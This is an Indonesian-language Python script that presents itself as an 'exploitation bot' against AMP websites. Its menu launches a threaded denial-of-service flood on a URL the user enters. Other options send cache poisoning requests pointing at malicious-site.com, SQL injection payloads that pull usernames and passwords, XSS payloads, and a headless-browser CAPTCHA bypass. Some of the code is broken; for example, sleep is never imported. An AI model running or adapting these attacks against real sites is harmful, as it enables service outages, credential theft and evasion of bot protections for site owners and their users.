import requests
import time
import threading
import logging
import random
import string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from concurrent.futures import ThreadPoolExecutor, as_completed
import asyncio

logging.basicConfig(filename='exploit_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def bot_response(message):
    print(f"Bot: {message}")
    logging.info(message)

async def send_doS_request(url):
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0',
            'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36'
        ]),
    }
    
    try:
        response = await asyncio.to_thread(requests.get, url, headers=headers)
        if response.status_code != 200:
            logging.error(f"Error: {response.status_code}")
        logging.info(f"Request sent to {url} | Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")

async def amp_dos_attack():
    bot_response("Memulai serangan Denial of Service (DoS) pada AMP...")
    url = input("Masukkan URL target untuk DoS attack: ")
    thread_count = int(input("Masukkan jumlah thread untuk DoS attack (misalnya 10): "))
    
    tasks = []
    for _ in range(thread_count):
        tasks.append(send_doS_request(url))
    
    await asyncio.gather(*tasks)
    bot_response("Serangan DoS pada AMP selesai.")

def cache_poisoning(url):
    headers = {
        'Cache-Control': 'public, max-age=3600',
        'X-Forwarded-Host': 'malicious-site.com'
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            logging.info("Cache poisoning berhasil. Respons server:")
            logging.info(response.text)
        else:
            logging.warning(f"Gagal memanipulasi cache. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")

def amp_cache_poisoning():
    bot_response("Memulai serangan Cache Poisoning pada AMP...")
    url = input("Masukkan URL target untuk cache poisoning: ")
    cache_poisoning(url)
    bot_response("Serangan Cache Poisoning pada AMP selesai.")

def sql_injection(url):
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "' OR 'x'='x",
    ]
    
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if "error" in response.text or "sql" in response.text.lower():
                logging.info(f"SQL Injection potential found with payload: {payload}")
            else:
                logging.info(f"SQL Injection failed with payload: {payload}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")

def amp_sql_injection():
    bot_response("Memulai serangan SQL Injection pada API AMP...")
    url = input("Masukkan URL endpoint API untuk SQL Injection: ")
    sql_injection(url)
    bot_response("Serangan SQL Injection pada AMP selesai.")

def xss_attack(url):
    payloads = [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if payload in response.text:
                logging.info(f"XSS berhasil disuntikkan dengan payload: {payload}")
            else:
                logging.info(f"XSS tidak berhasil dengan payload: {payload}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")

def amp_xss_attack():
    bot_response("Memulai serangan XSS pada AMP...")
    url = input("Masukkan URL untuk pengujian XSS: ")
    xss_attack(url)
    bot_response("Serangan XSS pada AMP selesai.")

def test_api_security(url):
    params = {
        'username': "' OR '1'='1",
        'password': "' OR '1'='1",
    }
    
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            logging.info("API tersedia dan merespons.")
        else:
            logging.warning(f"Error: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")

def amp_api_security_test():
    bot_response("Memulai pengujian keamanan API AMP...")
    url = input("Masukkan URL API AMP untuk pengujian: ")
    test_api_security(url)
    bot_response("Pengujian keamanan API AMP selesai.")

def bypass_captcha(url):
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        driver = webdriver.Chrome(options=chrome_options)
        driver.get(url)
        sleep(5)
        
        driver.find_element(By.ID, 'submit').click()
        logging.info("Captcha terlewati, permintaan dikirim.")
        driver.quit()
    except Exception as e:
        logging.error(f"Captcha bypass failed: {e}")

def bypass_protection():
    bot_response("Memulai bypass CAPTCHA dan proteksi bot...")
    url = input("Masukkan URL untuk bypass CAPTCHA: ")
    bypass_captcha(url)
    bot_response("Bypass CAPTCHA selesai.")

def main():
    bot_response("Selamat datang! Saya adalah bot eksploitasi yang akan membantu Anda memahami serangan terhadap situs web AMP.")
    while True:
        bot_response("\n🔥Pilih serangan untuk diuji 🔥:")
        bot_response("1. Denial of Service (DoS) pada AMP")
        bot_response("2. Cache Poisoning pada AMP")
        bot_response("3. SQL Injection pada API AMP")
        bot_response("4. XSS pada AMP")
        bot_response("5. Pengujian Keamanan API AMP")
        bot_response("6. Bypass CAPTCHA dan Proteksi Bot")
        bot_response("7. Keluar")
        
        choice = input("Masukkan pilihan Anda (1-7): ")
        
        if choice == '1':
            asyncio.run(amp_dos_attack())
        elif choice == '2':
            amp_cache_poisoning()
        elif choice == '3':
            amp_sql_injection()
        elif choice == '4':
            amp_xss_attack()
        elif choice == '5':
            amp_api_security_test()
        elif choice == '6':
            bypass_protection()
        elif choice == '7':
            bot_response("Terima kasih telah menggunakan bot eksploitasi. Sampai jumpa!")
            break
        else:
            bot_response("Pilihan tidak valid. Silakan pilih antara 1 dan 7.")

if __name__ == "__main__":
    main()
